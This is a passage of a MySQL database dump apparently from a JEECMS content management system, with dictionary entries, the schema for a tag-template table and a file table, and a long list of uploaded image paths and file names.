INSERT INTO `jc_dictionary` VALUES (1,'10-20人','10-20人','scale'),(2,'20-50人','20-50人','scale'),(3,'50-10人','50-10人','scale'),(4,'100人以上','100人以上','scale'),(5,'私企','私企','nature'),(6,'股份制','股份制','nature'),(7,'国企','国企','nature'),(8,'互联网','互联网','industry'),(9,'房地产','房地产','industry'),(10,'加工制造','加工制造','industry'),(11,'服务行业','服务行业','industry');
/*!40000 ALTER TABLE `jc_dictionary` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_directive_tpl`
--

DROP TABLE IF EXISTS `jc_directive_tpl`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_directive_tpl` (
  `tpl_id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL COMMENT '标签名称',
  `description` varchar(1000) DEFAULT NULL COMMENT '标签描述',
  `code` text COMMENT '标签代码',
  `user_id` int(11) NOT NULL COMMENT '标签创建者',
  PRIMARY KEY (`tpl_id`),
  KEY `fk_jc_directive_tpl_user` (`user_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='FComment';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_directive_tpl`
--

LOCK TABLES `jc_directive_tpl` WRITE;
/*!40000 ALTER TABLE `jc_directive_tpl` DISABLE KEYS */;
/*!40000 ALTER TABLE `jc_directive_tpl` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `jc_file`
--

DROP TABLE IF EXISTS `jc_file`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `jc_file` (
  `file_path` varchar(255) NOT NULL DEFAULT '' COMMENT '文件路径',
  `file_name` varchar(255) DEFAULT '' COMMENT '文件名字',
  `file_isvalid` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否有效',
  `content_id` int(11) DEFAULT NULL COMMENT '内容id',
  PRIMARY KEY (`file_path`),
  KEY `fk_jc_file_content` (`content_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `jc_file`
--

LOCK TABLES `jc_file` WRITE;
/*!40000 ALTER TABLE `jc_file` DISABLE KEYS */;
INSERT INTO `jc_file` VALUES ('/jeecmsv8/u/cms/www/201606/30094553q0uo.jpg','Koala.jpg',0,NULL),('/jeecmsv8f/u/cms/www/201610/13165317n9v8.jpg','1.jpg',0,NULL),('/u/cms/bj/201505/15163118hoig.jpg','mv1.jpg',0,NULL),('/u/cms/www/09093632txyy.jpg','09093632txyy.jpg',1,NULL),('/u/cms/www/090938248x1c.jpg','090938248x1c.jpg',1,NULL),('/u/cms/www/090940173zaj.jpg','090940173zaj.jpg',1,NULL),('/u/cms/www/09094140f562.jpg','09094140f562.jpg',1,NULL),('/u/cms/www/09094302sldg.jpg','09094302sldg.jpg',1,NULL),('/u/cms/www/09094430w0xt.jpg','09094430w0xt.jpg',1,NULL),('/u/cms/www/09151507n6i1.jpg','09151507n6i1.jpg',1,NULL),('/u/cms/www/09152518pzoq.jpg','09152518pzoq.jpg',1,NULL),('/u/cms/www/09152931cgps.jpg','09152931cgps.jpg',1,NULL),('/u/cms/www/091552426die.jpg','091552426die.jpg',1,NULL),('/u/cms/www/0915541140xt.jpg','0915541140xt.jpg',1,NULL),('/u/cms/www/09160120meel.jpg','09160120meel.jpg',1,NULL),('/u/cms/www/091602465aop.jpg','091602465aop.jpg',1,NULL),('/u/cms/www/09165026tk5e.jpg','09165026tk5e.jpg',1,NULL),('/u/cms/www/091655240woj.jpg','091655240woj.jpg',1,NULL),('/u/cms/www/09165821s06r.jpg','09165821s06r.jpg',1,NULL),('/u/cms/www/09170006n0hs.jpg','09170006n0hs.jpg',1,NULL),('/u/cms/www/09174523xkvt.jpg','09174523xkvt.jpg',1,NULL),('/u/cms/www/09174527lkok.jpg','09174527lkok.jpg',1,NULL),('/u/cms/www/10092229195q.jpg','10092229195q.jpg',1,NULL),('/u/cms/www/100950366ij3.jpg','100950366ij3.jpg',1,NULL),('/u/cms/www/100953460bvo.jpg','100953460bvo.jpg',1,NULL),('/u/cms/www/10103806oifr.jpg','10103806oifr.jpg',1,NULL),('/u/cms/www/10104531ukj5.jpg','10104531ukj5.jpg',1,NULL),('/u/cms/www/10144918u244.jpg','10144918u244.jpg',1,NULL),('/u/cms/www/11165619lkm8.jpg','11165619lkm8.jpg',1,NULL),('/u/cms/www/11165624319n.jpg','11165624319n.jpg',1,NULL),('/u/cms/www/111656292jx9.jpg','111656292jx9.jpg',1,NULL),('/u/cms/www/11165633po01.jpg','11165633po01.jpg',1,NULL),('/u/cms/www/111656366w4b.jpg','111656366w4b.jpg',1,NULL),('/u/cms/www/11165640djk4.jpg','11165640djk4.jpg',1,NULL),('/u/cms/www/11165849ahx1.jpg','11165849ahx1.jpg',1,NULL),('/u/cms/www/11170224nw94.jpg','11170224nw94.jpg',1,NULL),('/u/cms/www/11170651qc2f.jpg','11170651qc2f.jpg',1,NULL),('/u/cms/www/11170656zz9b.jpg','11170656zz9b.jpg',1,NULL),('/u/cms/www/111707001w2k.jpg','111707001w2k.jpg',1,NULL),('/u/cms/www/11170703j2h2.jpg','11170703j2h2.jpg',1,NULL),('/u/cms/www/111707071tn0.jpg','111707071tn0.jpg',1,NULL),('/u/cms/www/11170712hp37.jpg','11170712hp37.jpg',1,NULL),('/u/cms/www/111707541g63.jpg','111707541g63.jpg',1,NULL),('/u/cms/www/11171054ja61.jpg','11171054ja61.jpg',1,NULL),('/u/cms/www/11171058td8f.jpg','11171058td8f.jpg',1,NULL),('/u/cms/www/11171102ae78.jpg','11171102ae78.jpg',1,NULL),('/u/cms/www/11171106qaui.jpg','11171106qaui.jpg',1,NULL),('/u/cms/www/11171109m2sr.jpg','11171109m2sr.jpg',1,NULL),('/u/cms/www/11171211kmih.jpg','11171211kmih.jpg',1,NULL),('/u/cms/www/11171546aux9.jpg','11171546aux9.jpg',1,NULL),('/u/cms/www/111715499z6t.jpg','111715499z6t.jpg',1,NULL),('/u/cms/www/11171553t5kf.jpg','11171553t5kf.jpg',1,NULL),('/u/cms/www/11171558kiit.jpg','11171558kiit.jpg',1,NULL),('/u/cms/www/11171603em6o.jpg','11171603em6o.jpg',1,NULL),('/u/cms/www/11171606wnmy.jpg','11171606wnmy.jpg',1,NULL),('/u/cms/www/1117164754x7.jpg','1117164754x7.jpg',1,NULL),('/u/cms/www/11172127ltqx.jpg','11172127ltqx.jpg',1,NULL),('/u/cms/www/111721308eyj.jpg','111721308eyj.jpg',1,NULL),('/u/cms/www/11172134wikw.jpg','11172134wikw.jpg',1,NULL),('/u/cms/www/11172137nwy5.jpg','11172137nwy5.jpg',1,NULL),('/u/cms/www/11172219hw2t.jpg','11172219hw2t.jpg',1,NULL),('/u/cms/www/11173208w8ji.jpg','11173208w8ji.jpg',1,NULL),('/u/cms/www/11173213qlec.jpg','11173213qlec.jpg',1,NULL),('/u/cms/www/111732181p5u.jpg','111732181p5u.jpg',1,NULL),('/u/cms/www/11173222qknp.jpg','11173222qknp.jpg',1,NULL),('/u/cms/www/1117323496nx.jpg','1117323496nx.jpg',1,NULL),('/u/cms/www/11173244ggfv.jpg','11173244ggfv.jpg',1,NULL),('/u/cms/www/11173334yvdd.jpg','11173334yvdd.jpg',1,NULL),('/u/cms/www/111737053v9i.jpg','111737053v9i.jpg',1,NULL),('/u/cms/www/11173708ffx2.jpg','11173708ffx2.jpg',1,NULL),('/u/cms/www/11173711toqx.jpg','11173711toqx.jpg',1,NULL),('/u/cms/www/11173718do4k.jpg','11173718do4k.jpg',1,NULL),('/u/cms/www/11173719ykxk.jpg','11173719ykxk.jpg',1,NULL),('/u/cms/www/11173724ul7o.jpg','11173724ul7o.jpg',1,NULL),('/u/cms/www/11173804j6hj.jpg','11173804j6hj.jpg',1,NULL),('/u/cms/www/11174436pnoi.jpg','11174436pnoi.jpg',1,NULL),('/u/cms/www/11174439eb3l.jpg','11174439eb3l.jpg',1,NULL),('/u/cms/www/1117444317kg.jpg','1117444317kg.jpg',1,NULL),('/u/cms/www/111744466aux.jpg','111744466aux.jpg',1,NULL),('/u/cms/www/111745157ps9.jpg','111745157ps9.jpg',1,NULL),('/u/cms/www/12105715powr.jpg','12105715powr.jpg',1,NULL),('/u/cms/www/12105715u0i2.jpg','12105715u0i2.jpg',1,NULL),('/u/cms/www/12105716avso.jpg','12105716avso.jpg',1,NULL),('/u/cms/www/12105716f0ks.jpg','12105716f0ks.jpg',1,NULL),('/u/cms/www/12105716u081.jpg','12105716u081.jpg',1,NULL),('/u/cms/www/12105717rgdv.jpg','12105717rgdv.jpg',1,NULL),('/u/cms/www/12105908yuqz.jpg','12105908yuqz.jpg',1,NULL),('/u/cms/www/121101457hlo.jpg','121101457hlo.jpg',1,NULL),('/u/cms/www/121101459s0t.jpg','121101459s0t.jpg',1,NULL),('/u/cms/www/12110145r34m.jpg','12110145r34m.jpg',1,NULL),('/u/cms/www/12110146fexh.jpg','12110146fexh.jpg',1,NULL),('/u/cms/www/12110146v1cq.jpg','12110146v1cq.jpg',1,NULL),('/u/cms/www/12110146ynj3.jpg','12110146ynj3.jpg',1,NULL),('/u/cms/www/12110240hrzh.jpg','12110240hrzh.jpg',1,NULL),('/u/cms/www/121104013vts.jpg','121104013vts.jpg',1,NULL),('/u/cms/www/12110726kcxc.jpg','12110726kcxc.jpg',1,NULL),('/u/cms/www/12110726rqp4.jpg','12110726rqp4.jpg',1,NULL),('/u/cms/www/121107270owq.jpg','121107270owq.jpg',1,NULL),('/u/cms/www/1211072762wj.jpg','1211072762wj.jpg',1,NULL),('/u/cms/www/12110728cz8z.jpg','12110728cz8z.jpg',1,NULL),('/u/cms/www/12110728hvna.jpg','12110728hvna.jpg',1,NULL),('/u/cms/www/12110817ejy1.jpg','12110817ejy1.jpg',1,NULL),('/u/cms/www/12111106jy1l.jpg','12111106jy1l.jpg',1,NULL),('/u/cms/www/12111106lobh.jpg','12111106lobh.jpg',1,NULL),('/u/cms/www/12111106zad3.jpg','12111106zad3.jpg',1,NULL),('/u/cms/www/12111106zedy.jpg','12111106zedy.jpg',1,NULL),('/u/cms/www/12111107ctqg.jpg','12111107ctqg.jpg',1,NULL),('/u/cms/www/12111107l4wg.jpg','12111107l4wg.jpg',1,NULL),('/u/cms/www/1211124392sy.jpg','1211124392sy.jpg',1,NULL),('/u/cms/www/12111518igwr.jpg','12111518igwr.jpg',1,NULL),('/u/cms/www/12111518kvd2.jpg','12111518kvd2.jpg',1,NULL),('/u/cms/www/12111518l3p5.jpg','12111518l3p5.jpg',1,NULL),('/u/cms/www/12111518vk7v.jpg','12111518vk7v.jpg',1,NULL),('/u/cms/www/121115195muw.jpg','121115195muw.jpg',1,NULL),('/u/cms/www/12111519tyc2.jpg','12111519tyc2.jpg',1,NULL),('/u/cms/www/1211190051if.jpg','1211190051if.jpg',1,NULL),('/u/cms/www/12112124imh5.jpg','12112124imh5.jpg',1,NULL),('/u/cms/www/121121253f1z.jpg','121121253f1z.jpg',1,NULL),('/u/cms/www/121121265tk1.jpg','121121265tk1.jpg',1,NULL),('/u/cms/www/121121267h0z.jpg','121121267h0z.jpg',1,NULL),('/u/cms/www/12112127795n.jpg','12112127795n.jpg',1,NULL),('/u/cms/www/12112128ltfy.jpg','12112128ltfy.jpg',1,NULL),('/u/cms/www/12112247lfhe.jpg','12112247lfhe.jpg',1,NULL),('/u/cms/www/12120435rmvm.jpg','12120435rmvm.jpg',1,NULL),('/u/cms/www/12120436on4w.jpg','12120436on4w.jpg',1,NULL),('/u/cms/www/121204384v5d.jpg','121204384v5d.jpg',1,NULL),('/u/cms/www/121204408a3o.jpg','121204408a3o.jpg',1,NULL),('/u/cms/www/1212044200gm.jpg','1212044200gm.jpg',1,NULL),('/u/cms/www/121207389dlf.jpg','121207389dlf.jpg',1,NULL),('/u/cms/www/12134158q84h.jpg','12134158q84h.jpg',1,NULL),('/u/cms/www/12134158qzrx.jpg','12134158qzrx.jpg',1,NULL),('/u/cms/www/121341597c2x.jpg','121341597c2x.jpg',1,NULL),('/u/cms/www/12134159kbxa.jpg','12134159kbxa.jpg',1,NULL),('/u/cms/www/12134159robe.jpg','12134159robe.jpg',1,NULL),('/u/cms/www/12134200cwyl.jpg','12134200cwyl.jpg',1,NULL),('/u/cms/www/12134300ap1h.jpg','12134300ap1h.jpg',1,NULL),('/u/cms/www/12134450lo6n.jpg','12134450lo6n.jpg',1,NULL),('/u/cms/www/12134450mwvm.jpg','12134450mwvm.jpg',1,NULL),('/u/cms/www/12134451j9p9.jpg','12134451j9p9.jpg',1,NULL),('/u/cms/www/12134451k1zj.jpg','12134451k1zj.jpg',1,NULL),('/u/cms/www/12134452b2g1.jpg','12134452b2g1.jpg',1,NULL),('/u/cms/www/12134452bb5z.jpg','12134452bb5z.jpg',1,NULL),('/u/cms/www/12134552bk69.jpg','12134552bk69.jpg',1,NULL),('/u/cms/www/121348103ux5.jpg','121348103ux5.jpg',1,NULL),('/u/cms/www/121348109k92.jpg','121348109k92.jpg',1,NULL),('/u/cms/www/121348110tfi.jpg','121348110tfi.jpg',1,NULL),('/u/cms/www/12134811y9du.jpg','12134811y9du.jpg',1,NULL),('/u/cms/www/12134812unit.jpg','12134812unit.jpg',1,NULL),('/u/cms/www/12134933sxsx.jpg','12134933sxsx.jpg',1,NULL),('/u/cms/www/12135148im9s.jpg','12135148im9s.jpg',1,NULL),('/u/cms/www/12135149ar88.jpg','12135149ar88.jpg',1,NULL),('/u/cms/www/12135149bhlg.jpg','12135149bhlg.jpg',1,NULL),('/u/cms/www/12135149s2wm.jpg','12135149s2wm.jpg',1,NULL),('/u/cms/www/12135243x57l.jpg','12135243x57l.jpg',1,NULL),('/u/cms/www/12135606e58j.jpg','12135606e58j.jpg',1,NULL),('/u/cms/www/12135607ftvv.jpg','12135607ftvv.jpg',1,NULL),('/u/cms/www/12135607vqhp.jpg','12135607vqhp.jpg',1,NULL),('/u/cms/www/12135608ad8p.jpg','12135608ad8p.jpg',1,NULL),('/u/cms/www/12135608l3ai.jpg','12135608l3ai.jpg',1,NULL),('/u/cms/www/12135609wexl.jpg','12135609wexl.jpg',1,NULL),('/u/cms/www/12135827xy0y.jpg','12135827xy0y.jpg',1,NULL),('/u/cms/www/12135944xk9f.jpg','12135944xk9f.jpg',1,NULL),('/u/cms/www/12140033b5mx.jpg','12140033b5mx.jpg',1,NULL),('/u/cms/www/12140434ixtu.jpg','12140434ixtu.jpg',1,NULL),('/u/cms/www/12140434n4th.jpg','12140434n4th.jpg',1,NULL),('/u/cms/www/12140435relm.jpg','12140435relm.jpg',1,NULL),('/u/cms/www/12140436rua8.jpg','12140436rua8.jpg',1,NULL),('/u/cms/www/12140436wwsc.jpg','12140436wwsc.jpg',1,NULL),('/u/cms/www/12140851yp14.jpg','12140851yp14.jpg',1,NULL),('/u/cms/www/12141311nuua.jpg','12141311nuua.jpg',1,NULL),('/u/cms/www/12141311xxbj.jpg','12141311xxbj.jpg',1,NULL),('/u/cms/www/12141312d3p6.jpg','12141312d3p6.jpg',1,NULL),('/u/cms/www/12141312r6eb.jpg','12141312r6eb.jpg',1,NULL),('/u/cms/www/1214131399h0.jpg','1214131399h0.jpg',1,NULL),('/u/cms/www/12141313ndlq.jpg','12141313ndlq.jpg',1,NULL),('/u/cms/www/121414505xah.jpg','121414505xah.jpg',1,NULL),('/u/cms/www/12142118fe7p.jpg','12142118fe7p.jpg',1,NULL),('/u/cms/www/121421197sla.jpg','121421197sla.jpg',1,NULL),('/u/cms/www/12142119m8y5.jpg','12142119m8y5.jpg',1,NULL),('/u/cms/www/12142120loqu.jpg','12142120loqu.jpg',1,NULL),('/u/cms/www/12142120u2tx.jpg','12142120u2tx.jpg',1,NULL),('/u/cms/www/1214212172bk.jpg','1214212172bk.jpg',1,NULL),('/u/cms/www/12142322wa0z.jpg','12142322wa0z.jpg',1,NULL),('/u/cms/www/12142734jwmh.jpg','12142734jwmh.jpg',1,NULL),('/u/cms/www/12142735jqmu.jpg','12142735jqmu.jpg',1,NULL),('/u/cms/www/12142735rhib.jpg','12142735rhib.jpg',1,NULL),('/u/cms/www/1214273617d5.jpg','1214273617d5.jpg',1,NULL),('/u/cms/www/12142736ue6c.jpg','12142736ue6c.jpg',1,NULL),('/u/cms/www/12142737cr9y.jpg','12142737cr9y.jpg',1,NULL),('/u/cms/www/12142830poeb.jpg','12142830poeb.jpg',1,NULL),('/u/cms/www/1214325480ue.jpg','1214325480ue.jpg',1,NULL),('/u/cms/www/12143254y1wh.jpg','12143254y1wh.jpg',1,NULL),('/u/cms/www/121432556ttu.jpg','121432556ttu.jpg',1,NULL),('/u/cms/www/12143255ryzh.jpg','12143255ryzh.jpg',1,NULL),('/u/cms/www/12143255ukxu.jpg','12143255ukxu.jpg',1,NULL),('/u/cms/www/12143256g1bo.jpg','12143256g1bo.jpg',1,NULL),('/u/cms/www/12143342sfmg.jpg','12143342sfmg.jpg',1,NULL),('/u/cms/www/121454345gdz.jpg','121454345gdz.jpg',1,NULL),('/u/cms/www/12145434959z.jpg','12145434959z.jpg',1,NULL),('/u/cms/www/12145434qkiz.jpg','12145434qkiz.jpg',1,NULL),('/u/cms/www/12145435lmi6.jpg','12145435lmi6.jpg',1,NULL),('/u/cms/www/12145435u9c1.jpg','12145435u9c1.jpg',1,NULL),('/u/cms/www/121456599tnd.jpg','121456599tnd.jpg',1,NULL),('/u/cms/www/12150556da16.jpg','12150556da16.jpg',1,NULL),('/u/cms/www/12150556inf7.jpg','12150556inf7.jpg',1,NULL),('/u/cms/www/12150557dzrz.jpg','12150557dzrz.jpg',1,NULL),('/u/cms/www/12150557etcp.jpg','12150557etcp.jpg',1,NULL),('/u/cms/www/12150701tmkd.jpg','12150701tmkd.jpg',1,NULL),('/u/cms/www/12150936264i.jpg','12150936264i.jpg',1,NULL),('/u/cms/www/121509368460.jpg','121509368460.jpg',1,NULL),('/u/cms/www/12150936cnpa.jpg','12150936cnpa.jpg',1,NULL),('/u/cms/www/121509371kyv.jpg','121509371kyv.jpg',1,NULL),('/u/cms/www/12150937xe3g.jpg','12150937xe3g.jpg',1,NULL),('/u/cms/www/12151139jrv6.jpg','12151139jrv6.jpg',1,NULL),('/u/cms/www/1215211539ic.jpg','1215211539ic.jpg',1,NULL),('/u/cms/www/12152115dymp.jpg','12152115dymp.jpg',1,NULL),('/u/cms/www/12152115n7ee.jpg','12152115n7ee.jpg',1,NULL),('/u/cms/www/12152115oqbj.jpg','12152115oqbj.jpg',1,NULL),('/u/cms/www/12152116am9n.jpg','12152116am9n.jpg',1,NULL),('/u/cms/www/12152257va9g.jpg','12152257va9g.jpg',1,NULL),('/u/cms/www/12153550461x.jpg','12153550461x.jpg',1,NULL),('/u/cms/www/12153550ryso.jpg','12153550ryso.jpg',1,NULL),('/u/cms/www/12153551fflz.jpg','12153551fflz.jpg',1,NULL),('/u/cms/www/12153551igy5.jpg','12153551igy5.jpg',1,NULL),('/u/cms/www/12153551r5kz.jpg','12153551r5kz.jpg',1,NULL),('/u/cms/www/121535526foq.jpg','121535526foq.jpg',1,NULL),('/u/cms/www/121536505s2h.jpg','121536505s2h.jpg',1,NULL),('/u/cms/www/121542148jkc.jpg','121542148jkc.jpg',1,NULL),('/u/cms/www/121542158t1n.jpg','121542158t1n.jpg',1,NULL),('/u/cms/www/121542159xil.jpg','121542159xil.jpg',1,NULL),('/u/cms/www/12154215ryyk.jpg','12154215ryyk.jpg',1,NULL),('/u/cms/www/12154215y02n.jpg','12154215y02n.jpg',1,NULL),('/u/cms/www/12154216egtt.jpg','12154216egtt.jpg',1,NULL),('/u/cms/www/121543059cct.jpg','121543059cct.jpg',1,NULL),('/u/cms/www/12154708kkn6.jpg','12154708kkn6.jpg',1,NULL),('/u/cms/www/12154708nsye.jpg','12154708nsye.jpg',1,NULL),('/u/cms/www/12154708we6w.jpg','12154708we6w.jpg',1,NULL),('/u/cms/www/12154709iod3.jpg','12154709iod3.jpg',1,NULL),('/u/cms/www/12154709ypkl.jpg','12154709ypkl.jpg',1,NULL),('/u/cms/www/121547582f5t.jpg','121547582f5t.jpg',1,NULL),('/u/cms/www/1311420498g8.jpg','1311420498g8.jpg',1,NULL),('/u/cms/www/131203117zrn.jpg','131203117zrn.jpg',1,NULL),('/u/cms/www/131257327chh.jpg','131257327chh.jpg',1,NULL),('/u/cms/www/13141220dfer.jpg','13141220dfer.jpg',1,NULL),('/u/cms/www/131423399l1z.jpg','131423399l1z.jpg',1,NULL),('/u/cms/www/13142927kzr3.jpg','13142927kzr3.jpg',1,NULL),('/u/cms/www/1316285322ks.jpg','1316285322ks.jpg',1,NULL),('/u/cms/www/13162904gqxm.jpg','13162904gqxm.jpg',1,NULL),('/u/cms/www/13162913da42.jpg','13162913da42.jpg',1,NULL),('/u/cms/www/131629222u39.jpg','131629222u39.jpg',1,NULL),('/u/cms/www/13162931ofsn.jpg','13162931ofsn.jpg',1,NULL),('/u/cms/www/13162941ipg2.jpg','13162941ipg2.jpg',1,NULL),('/u/cms/www/13163101ccd3.jpg','13163101ccd3.jpg',1,NULL),('/u/cms/www/13163113pd3s.jpg','13163113pd3s.jpg',1,NULL),('/u/cms/www/13163306pqvc.jpg','13163306pqvc.jpg',1,NULL),('/u/cms/www/13165112t47d.jpg','13165112t47d.jpg',1,NULL),('/u/cms/www/13165118lr7r.jpg','13165118lr7r.jpg',1,NULL),('/u/cms/www/13165348xokj.jpg','13165348xokj.jpg',1,NULL),('/u/cms/www/131656557m43.jpg','131656557m43.jpg',1,NULL),('/u/cms/www/13165702cchp.jpg','13165702cchp.jpg',1,NULL),('/u/cms/www/13170123ywvv.jpg','13170123ywvv.jpg',1,NULL),('/u/cms/www/13170129mx9q.jpg','13170129mx9q.jpg',1,NULL),('/u/cms/www/13170427k084.jpg','13170427k084.jpg',1,NULL),('/u/cms/www/131706089h4w.jpg','131706089h4w.jpg',1,NULL),('/u/cms/www/13170759d8ow.jpg','13170759d8ow.jpg',1,NULL),('/u/cms/www/13170940lu1h.jpg','13170940lu1h.jpg',1,NULL),('/u/cms/www/19110822fin2.jpg','19110822fin2.jpg',1,NULL),('/u/cms/www/19112623820c.jpg','19112623820c.jpg',1,NULL),('/u/cms/www/19112700bypf.jpg','19112700bypf.jpg',1,NULL),('/u/cms/www/19114043tp85.jpg','19114043tp85.jpg',1,NULL),('/u/cms/www/19114201tdir.jpg','19114201tdir.jpg',1,NULL),('/u/cms/www/191201449moh.jpg','191201449moh.jpg',1,NULL),('/u/cms/www/191203538tdp.jpg','191203538tdp.jpg',1,NULL),('/u/cms/www/19131809acqm.jpg','19131809acqm.jpg',1,NULL),('/u/cms/www/19131949r2ge.jpg','19131949r2ge.jpg',1,NULL),('/u/cms/www/191342393mlg.jpg','191342393mlg.jpg',1,NULL),('/u/cms/www/19134448qvza.jpg','19134448qvza.jpg',1,NULL),('/u/cms/www/191351590e53.jpg','191351590e53.jpg',1,NULL),('/u/cms/www/19135642zjak.jpg','19135642zjak.jpg',1,NULL),('/u/cms/www/19135645ge7r.jpg','19135645ge7r.jpg',1,NULL),('/u/cms/www/19135821ij0m.jpg','19135821ij0m.jpg',1,NULL),('/u/cms/www/19140340fri2.jpg','19140340fri2.jpg',1,NULL),('/u/cms/www/19140601kgid.jpg','19140601kgid.jpg',1,NULL),('/u/cms/www/19140803w9fg.jpg','19140803w9fg.jpg',1,NULL),('/u/cms/www/191408471iyj.jpg','191408471iyj.jpg',1,NULL),('/u/cms/www/19141200ip5c.jpg','19141200ip5c.jpg',1,NULL),('/u/cms/www/19141318apz1.jpg','19141318apz1.jpg',1,NULL),('/u/cms/www/19141700opui.jpg','19141700opui.jpg',1,NULL),('/u/cms/www/19141756u9sa.jpg','19141756u9sa.jpg',1,NULL),('/u/cms/www/19142041eu8x.jpg','19142041eu8x.jpg',1,NULL),('/u/cms/www/19142206y73m.jpg','19142206y73m.jpg',1,NULL),('/u/cms/www/19142430589t.jpg','19142430589t.jpg',1,NULL),('/u/cms/www/19142451945q.jpg','19142451945q.jpg',1,NULL),('/u/cms/www/19142818yvty.jpg','19142818yvty.jpg',1,NULL),('/u/cms/www/19142840ycm6.jpg','19142840ycm6.jpg',1,NULL),('/u/cms/www/201139137vu6.jpg','201139137vu6.jpg',1,NULL),('/u/cms/www/20114003od1n.jpg','20114003od1n.jpg',1,NULL),('/u/cms/www/201140399nrc.jpg','201140399nrc.jpg',1,NULL),('/u/cms/www/201143116bd3.jpg','201143116bd3.jpg',1,NULL),('/u/cms/www/20114348t1z8.jpg','20114348t1z8.jpg',1,NULL),('/u/cms/www/20114520rqti.jpg','20114520rqti.jpg',1,NULL),('/u/cms/www/20114607jim6.jpg','20114607jim6.jpg',1,NULL),('/u/cms/www/20114824s9bf.jpg','20114824s9bf.jpg',1,NULL),('/u/cms/www/20115532h8tv.jpg','20115532h8tv.jpg',1,NULL),('/u/cms/www/201159459afm.jpg','201159459afm.jpg',1,NULL),('/u/cms/www/20120531bbei.jpg','20120531bbei.jpg',1,NULL),('/u/cms/www/20120732ybv8.jpg','20120732ybv8.jpg',1,NULL),('/u/cms/www/201308','201308',1,NULL),('/u/cms/www/201308//mv.jpg','mv.jpg',0,NULL),('/u/cms/www/201309','201309',1,NULL),('/u/cms/www/201312/301119254w80.flv','/u/cms/www/201312/301119254w80.flv',0,NULL),('/u/cms/www/201505/08115215axo2.jpg','mv1.jpg',0,NULL),('/u/cms/www/201505/08115420e3qq.jpg','mv1.jpg',0,NULL),('/u/cms/www/201505/08115602zbpp.jpg','mv1.jpg',0,NULL),('/u/cms/www/201505/0814345226bf.png','屏幕截图(1).png',0,NULL),('/u/cms/www/201505/081435107c1f.png','QQ图片20150417172121.png',0,NULL),('/u/cms/www/201505/08143510hn5q.jpg','mv1.jpg',0,NULL),('/u/cms/www/201505/19101000895y.jpg','2.jpg',0,NULL),('/u/cms/www/201505/19102214sw7g.jpg','2.jpg',0,NULL),('/u/cms/www/201505/28153507v3si.jpg','2.jpg',0,NULL),('/u/cms/www/201505/28153820xz3s.jpg','2.jpg',0,NULL),('/u/cms/www/201505/28155213xbnf.jpg','2.jpg',0,NULL),('/u/cms/www/201505/28155257lfcw.jpg','2.jpg',0,NULL),('/u/cms/www/201505/28155304ool6.jpg','2.jpg',0,NULL),('/u/cms/www/201508/10104142j87z.jpg','2.jpg',0,NULL),('/u/cms/www/201508/101104049u6a.jpg','2.jpg',0,NULL),('/u/cms/www/201508/10110750eroe.jpg','2.jpg',0,NULL),('/u/cms/www/201508/101109584374.jpg','3.jpg',0,NULL),('/u/cms/www/201508/10112023agt7.jpg','3.jpg',0,NULL),('/u/cms/www/201508/10163704n0m7.jpg','2.jpg',0,NULL),('/u/cms/www/201508/10172037p56n.jpg','3.jpg',0,NULL),('/u/cms/www/201508/271405251vsw.jpg','2.jpg',0,NULL),('/u/cms/www/201508/27141715ku66.jpg','2.jpg',0,NULL),('/u/cms/www/201508/271419260xl6.jpg','2.jpg',0,NULL),('/u/cms/www/201510/08103133dosc.jpg','1.jpg',0,NULL),('/u/cms/www/201510/08104832360a.jpg','1.jpg',0,NULL),('/u/cms/www/201510/08105041f9xd.jpg','1.jpg',0,NULL),('/u/cms/www/201510/081613140y6j.jpg','1.jpg',0,NULL),('/u/cms/www/201510/08161359pv1d.jpg','2.jpg',0,NULL),('/u/cms/www/201510/08161538j0sn.png','logo.png',0,NULL),('/u/cms/www/201510/08162637wfpl.png','logo.png',0,NULL),('/u/cms/www/201510/08172019lz4w.png','logo.png',0,NULL),('/u/cms/www/201510/27142936gt6k.jpg','131423399l1z.jpg',0,NULL),('/u/cms/www/201607/15144722d5ed.jpg','banner02.jpg',0,2),('/u/cms/www/201607/151530033koq.jpg','xZ.jpg',1,7),('/u/cms/www/201607/15154001xgx4.jpg','banner04.jpg',0,NULL),('/u/cms/www/201607/15154249ucra.jpg','banner05.jpg',1,2),('/u/cms/www/201607/15154302mvu4.jpg','MAIN201607051346000203081566005.jpg',1,2),('/u/cms/www/201607/15154338b6h9.jpg','MAIN201607051346000202770265284.jpg',1,2),('/u/cms/www/201607/19141129f6g4.jpg','qweq.jpg',1,13),('/u/cms/www/201607/19141205t5d9.jpg','MAIN201607190815465375224112529.jpg',0,NULL),('/u/cms/www/201607/19142033fu5h.jpg','zxc.jpg',1,14),('/u/cms/www/201608/30174757ffr0.jpg','255901999.jpg',0,NULL),('/u/cms/www/201609/13103353l0rl.png','small-prev-page-on.png',0,NULL),('/u/cms/www/201609/131035049a54.png','m-sj.png',0,NULL),('/u/cms/www/201609/13103723gjne.png','small-prev-page-on.png',0,NULL),('/u/cms/www/201609/13103724lwp5.png','small-next-page.png',0,NULL),('/u/cms/www/201609/13103724wi3l.png','small-next-page-on.png',0,NULL),('/u/cms/www/201609/1310372501bw.png','small-prev-page.png',0,NULL),('/u/cms/www/201609/13103813zfv9.png','member-nav.png',0,NULL),('/u/cms/www/201609/13103824db3u.png','m-sj.png',0,NULL),('/u/cms/www/201609/19152319tjq4.png','zsr.png',0,NULL),('/u/cms/www/201609/19152412hzzi.png','zsr.png',0,NULL),('/u/cms/www/201609/191535032l85.png','zhye.png',0,NULL),('/u/cms/www/201609/19153503qjwl.png','zsr.png',0,NULL),('/u/cms/www/201609/19153920h4eu.png','zhye.png',0,NULL),('/u/cms/www/201609/19154055s1o7.png','zhye.png',0,NULL),('/u/cms/www/201609/191544366efu.png','gmcs.png',0,NULL),('/u/cms/www/201609/19154641z4av.png','gmcs.png',0,NULL),('/u/cms/www/201609/191547450q92.png','gmcs.png',0,NULL),('/u/cms/www/201609/19154854sed0.png','gmcs.png',0